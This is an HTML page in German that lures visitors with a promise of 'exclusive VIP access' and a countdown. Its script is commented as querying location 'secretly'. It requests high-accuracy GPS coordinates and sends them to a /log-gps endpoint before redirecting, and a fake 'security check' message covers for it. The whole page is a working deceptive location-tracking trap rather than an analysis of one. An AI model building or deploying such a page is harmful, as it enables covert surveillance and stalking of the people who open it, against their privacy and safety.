<!DOCTYPE html>
<html>
<head>
    <title>Exklusiver VIP-Zugang 🔐</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: black;
            color: white;
            text-align: center;
            padding-top: 50px;
            cursor: pointer;
        }
        #countdown {
            font-size: 24px;
            margin-top: 20px;
            color: gold;
        }
    </style>
</head>
<body onclick="redirectWithTracking()">
    <h1>👉 KLICK FÜR VIP-ZUTRITT 👈</h1>
    <p>Du wirst in <span id="countdown">3</span> Sekunden weitergeleitet...</p>
	<div id="loading" style="display:none;">
    <p>🔒 Sicherheitsüberprüfung wird abgeschlossen...</p>
</div>

    <script>
        let count = 3;
        const countdown = setInterval(() => {
            document.getElementById('countdown').textContent = --count;
            if (count <= 0) redirectWithTracking();
        }, 1000);

        function redirectWithTracking() {
            // 1. GPS abfragen (heimlich)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        // Daten an Server senden
                        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
                        fetch(`/log-gps?lat=${lat}&lon=${lon}&accuracy=${accuracy}`);
                    },
                    err => {
                        // Fallback: IP loggen
                        fetch('/log-gps?error=blocked');
                    },
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
            }

            // 2. Weiterleiten (auch wenn GPS blockiert)
            window.location.href = '/redirect';
        }
    </script>
</body>
</html>
